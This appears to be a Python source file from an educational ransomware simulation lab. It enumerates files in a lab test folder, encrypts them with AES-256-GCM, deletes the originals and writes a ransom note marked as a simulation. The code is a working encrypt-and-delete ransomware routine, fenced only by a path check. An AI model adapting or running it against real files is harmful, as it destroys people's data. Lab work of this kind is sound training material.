import os
from pathlib import Path
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from ransomware.file_generator import LAB_TARGET_DIR
from ransomware.key_manager import (
    DEFAULT_KEY_FILE,
    carregar_chave,
    garantir_caminho_seguro,
    registrar_evento,
)


NOME_RESGATE = "README_RESCATE.txt"
EXTENSAO_CIFRADO = ".enc"
TAMANHO_NONCE = 12

class EncryptorError(Exception):
    """Exceção específica para falhas na rotina de cifragem simulada."""


def listar_arquivos_alvo(diretorio_alvo: Path = LAB_TARGET_DIR) -> list[Path]:
    """Lista arquivos elegíveis para cifragem estritamente dentro de lab/test_files."""
    raiz_segura = garantir_caminho_seguro(diretorio_alvo, LAB_TARGET_DIR)
    if not raiz_segura.exists():
        raise EncryptorError(f"Diretório alvo não encontrado: {raiz_segura}")

    alvos: list[Path] = []
    for item in raiz_segura.iterdir():
        caminho_seguro = garantir_caminho_seguro(item, raiz_segura)
        if not caminho_seguro.is_file():
            continue
        if caminho_seguro.name == NOME_RESGATE:
            continue
        if caminho_seguro.name.endswith(EXTENSAO_CIFRADO):
            continue
        alvos.append(caminho_seguro)

    return sorted(alvos)


def criptografar_arquivo(arquivo: Path, chave: bytes, raiz_permitida: Path = LAB_TARGET_DIR) -> Path:
    """Cifra um único arquivo com AES-256-GCM e grava com extensão .enc."""
    caminho_origem = garantir_caminho_seguro(arquivo, raiz_permitida)
    destino_cifrado = garantir_caminho_seguro(
        caminho_origem.with_name(caminho_origem.name + EXTENSAO_CIFRADO),
        raiz_permitida,
    )

    if len(chave) != 32:
        raise EncryptorError("A chave fornecida deve ter exatamente 32 bytes (AES-256).")

    try:
        dados_originais = caminho_origem.read_bytes()
        nonce = os.urandom(TAMANHO_NONCE)
        aesgcm = AESGCM(chave)
        ciphertext = aesgcm.encrypt(nonce, dados_originais, None)

        destino_cifrado.write_bytes(nonce + ciphertext)
        caminho_origem.unlink()

        registrar_evento(
            modulo="encryptor",
            acao="criptografar_arquivo_sucesso",
            detalhes={
                "arquivo_original": caminho_origem.name,
                "arquivo_cifrado": destino_cifrado.name,
                "bytes_originais": len(dados_originais),
            },
        )
        return destino_cifrado
    except (OSError, InvalidTag) as exc:
        registrar_evento(
            modulo="encryptor",
            acao="criptografar_arquivo_erro",
            detalhes={"arquivo": caminho_origem.name, "erro": str(exc)},
        )
        raise EncryptorError(f"Falha ao cifrar '{caminho_origem.name}': {exc}") from exc


def criar_mensagem_resgate(diretorio_alvo: Path = LAB_TARGET_DIR) -> Path:
    """Cria o arquivo fictício README_RESCATE.txt dentro do diretório de teste."""
    raiz_segura = garantir_caminho_seguro(diretorio_alvo, LAB_TARGET_DIR)
    caminho_resgate = garantir_caminho_seguro(raiz_segura / NOME_RESGATE, raiz_segura)

    conteudo = (
        "=== AVISO DE SIMULACAO EDUCACIONAL (LABORATORIO DE CIBERSEGURANCA) ===\n"
        "Os arquivos ficticios deste diretorio de laboratorio foram cifrados com AES-256-GCM.\n"
        "Este e um exercicio academico controlado em ambiente isolado.\n"
        "Utilize o modulo decryptor.py com a chave do laboratorio para restaurar os arquivos.\n"
    )

    try:
        caminho_resgate.write_text(conteudo, encoding="utf-8")
        registrar_evento(
            modulo="encryptor",
            acao="criar_mensagem_resgate_sucesso",
            detalhes={"arquivo_resgate": caminho_resgate.name, "diretorio": str(raiz_segura)},
        )
        return caminho_resgate
    except OSError as exc:
        registrar_evento(
            modulo="encryptor",
            acao="criar_mensagem_resgate_erro",
            detalhes={"arquivo_resgate": caminho_resgate.name, "erro": str(exc)},
        )
        raise EncryptorError(f"Falha ao criar {NOME_RESGATE}: {exc}") from exc


def executar_cifragem(
    diretorio_alvo: Path = LAB_TARGET_DIR,
    caminho_chave: Path = DEFAULT_KEY_FILE,
) -> list[Path]:
    """Executa o fluxo completo de cifragem simulada no diretório do laboratório."""
    chave = carregar_chave(caminho_chave)
    alvos = listar_arquivos_alvo(diretorio_alvo)

    arquivos_cifrados: list[Path] = []
    for arquivo in alvos:
        cifrado = criptografar_arquivo(arquivo, chave, raiz_permitida=diretorio_alvo)
        arquivos_cifrados.append(cifrado)

    criar_mensagem_resgate(diretorio_alvo)
    registrar_evento(
        modulo="encryptor",
        acao="execucao_cifragem_concluida",
        detalhes={"total_arquivos_cifrados": len(arquivos_cifrados)},
    )
    return arquivos_cifrados


if __name__ == "__main__":
    cifrados = executar_cifragem()
    print(f"Arquivos cifrados ({len(cifrados)}):")
    for item in cifrados:
        print(f" - {item.name}")
    print(f"Nota de resgate criada em: {LAB_TARGET_DIR / NOME_RESGATE}")